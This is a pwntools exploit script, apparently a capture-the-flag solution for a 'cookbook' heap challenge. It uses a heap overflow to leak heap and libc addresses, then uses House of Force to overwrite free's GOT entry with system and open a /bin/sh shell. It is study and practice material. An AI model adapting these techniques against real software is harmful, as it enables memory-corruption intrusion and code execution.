from pwn import *
import ctypes

# context.log_level = "debug"
p = process("cookbook")

# name
p.sendline("A"*20)
p.recv()


"""
    First we need a heap leak,
    there is an overflow in the 'instructions' char * array in
    the recipe struct.

    The binary has nodes with ptrs that create linked lists
    to track where ingredient and recipe objects are.

    I did some heap feng-shui so that one of these nodes
    would follow a recipe. I would then overflow the recipe,
    and corrupt the node for our new ingredient to point to a global
    with a heap ptr. I then printed all of the ingredients, leaking the heap.

    I then overflowed the ptr again to point it at the got, then printed
    the ingredients again. This would provide a libc leak.
    
    1. allocate a recipe,
    2. create a name for the cookbook of size 0x8.
    3. create an ingredient.
    4. free the name chunk.
    5. add the ingredient to the list of ingredients. 
        - glibc will reuse the freed cookbook name chunk.
        - this places the node chunk right after our recipe.

    6. overflow the ptr, pointing it to a global.
    7. print the ingredients, leaking the heap.
    8. overflow the ptr, pointing it to the got.
    9. print the ingredients, leaking libc.
"""


# 1.
# create new recipe
p.sendline("c")
p.recv()

# new recipe
p.sendline("n")
p.recv()

# quit
p.sendline("q")
p.recv()

# 2. 
# name cookbook
p.sendline("g")

# malloc size
p.sendline("8")
p.recvuntil("hacker!)")

# content
p.sendline("p"*8)
p.recv()

# 3.
# add ingredient menu
p.sendline("a")
p.recv()

# new ingredient
p.sendline("n")
p.recv()

# quit
p.sendline("q")
p.recv()

# 4. 
# free cookbook name
p.sendline("R")
p.recv()

# 5. 
# add ingredient menu
p.sendline("a")
p.recvuntil("doesn't quit)?")

# name ingredient
p.sendline("g")
p.recv()

p.sendline("C"*32)

# add ingredient
p.sendline("e")
p.recv()

p.sendline("q")
p.recv()
# 6. 
p.sendline("c")
p.recv()

p.sendline("g")

p.sendline("a"*896 + p32(0x11) + p32(0x0804d08c) + p32(0))

p.sendline("q")
p.recv()
# 7. 
p.sendline("l")

data = p.recv()

heap_leak = int(
    data.split("calories: ")[-1].split("\n")[0],
    10
)

print "Heap leak:", hex(heap_leak)

# 8.
p.sendline("c")
p.recv()

p.sendline("g")

p.sendline("a"*896 + p32(0x11) + p32(0x0804d00c) + p32(0))

p.sendline("q")
p.recv()

# 9.
p.sendline("l")

data = p.recv()

libc_leak = int(
    data.split("calories: ")[-1].split("\n")[0],
    10
)
libc_leak = ctypes.c_uint32(libc_leak).value

libc_base = libc_leak - 1293936

system_ptr = libc_base + 241056

print "libc leak:", hex(libc_leak)


# now we are free to create a new recipe, and overflow the 
# top chunk's size, allowing us to perform house of force.

# free cookbook name
p.sendline("R")
print p.recv()

# delete old recipe, use create name to split up chunk
p.sendline("c")
p.recv()

p.sendline("d")
p.recv()

p.sendline("q")
p.recv()

p.sendline("g")

# i created a name of 0x40c size so to consume 
# the free chunk where our old recipe resided.

# malloc size
p.sendline("40C")
p.recvuntil("hacker!)")

# content
p.sendline("Q"*32)
p.recv()

# create new recipe at top chunk
p.sendline("c")
p.recv()

p.sendline("n")
p.recv()

# overflow top chunk size
p.sendline("g")

p.sendline("b"*896 + p32(0xffffffff))

p.sendline("q")
p.recv()

top_loc = heap_leak + 4532
print "Top chunk loc:", hex(top_loc)

target = 0x0804d018

final_val = ctypes.c_int32(
    target - 8 - top_loc - 4
).value

print "final_val:",hex(final_val)
unsigned = hex(ctypes.c_uint32(final_val).value)
print "unsigned val:", unsigned

unsigned = unsigned[2:]

# house of force, malloc after this will point to free in got.
p.sendline("g")
p.sendline(unsigned)
p.sendline("")
p.recv()

# overwrite free to point to system
p.sendline("g")
p.sendline("400")
p.sendline(p32(system_ptr))

# create name /bin/sh
p.sendline("g")
p.sendline("8")
p.sendline("/bin/sh")
p.recv()

# free name, which calls system on the contents of name,
# popping a shell.
p.sendline("R")

p.interactive()

